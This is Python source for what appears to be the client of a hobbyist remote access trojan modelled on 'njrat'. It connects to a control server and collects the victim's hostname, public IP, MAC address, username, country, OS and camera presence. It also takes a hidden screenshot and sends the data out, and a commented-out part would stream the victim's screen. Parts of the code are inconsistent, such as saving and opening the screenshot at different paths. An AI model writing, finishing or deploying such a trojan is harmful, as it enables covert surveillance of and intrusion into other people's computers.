# from vidstream import ScreenShareClient
# import threading
#
# sender = ScreenShareClient('192.168.1.103', 1234)
#
# thread = threading.Thread(target=sender.start_stream).start()
import socket
import os
import platform
import pyautogui
import time
import base64
import json
from requests import *
from getmac import get_mac_address as gma
from infi.devicemanager import DeviceManager

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
    try:
        client.connect((socket.gethostbyname(socket.gethostname()), 9999))
    except socket.error as msg:
         print("Unable to connect to server: %s" % msg)
    else:
        break

HEADER = 64
DISCONNECT_MESSAGE = '!DISCONNECTED'
print('connected')

def test_camera():
    dm = DeviceManager()
    dm.root.rescan()
    devices = dm.all_devices
    for device in devices:
        if 'Camera' in str(device):
            return 'Yes'
    return 'No'

def screenshot(name):
    sc=pyautogui.screenshot()
    sc.save(fr'C:\Users\{name}\Desktop\njrat\sc.png')
    os.system('attrib +h sc.png')
    with open('sc.png', 'rb') as image_file:
         encoded_image = base64.b64encode(image_file.read())
    os.remove(fr'C:\Users\{name}\Desktop\njrat\sc.png')
    return str(encoded_image)


# check ping os.system('ping 127.0.0.1')


name = str(platform.node())
ip = str(get('https://api.ipify.org').text)
mac = str(gma())
user = str(os.environ.get('USERNAME'))
country = get('http://ipinfo.io/json').json()
operating_system = platform.system() + ' ' + platform.release()
camera = test_camera()
image = screenshot(user)
data_to_send = ["1",name,ip,mac,user,country['country'],operating_system,camera]
data_string = json.dumps(data_to_send)

try:
   client.send(data_string.encode())
except socket.error as msg:
   pass


try:
    while True:
        data = client.recv(4096)
        #print(data.decode('utf-8'))
        if not data:
           break

except KeyboardInterrupt:
    print('Procedure was interrupted')

except socket.error:
    print("The connection is lost, server may be down")


client.close()

#
#
# def send(msg):
#    message = msg.encode('utf-8')
#    msg_lenght = len(message)
#    send_lenght = str(msg_lenght).encode('utf-8')
#    send_lenght += b' ' * (HEADER - len(send_lenght))
#    client.send(send_lenght)
#    client.send(message)
#
#
# send('Patoto')
# input('Press enter for disconnect...')
# send(DISCONNECT_MESSAGE)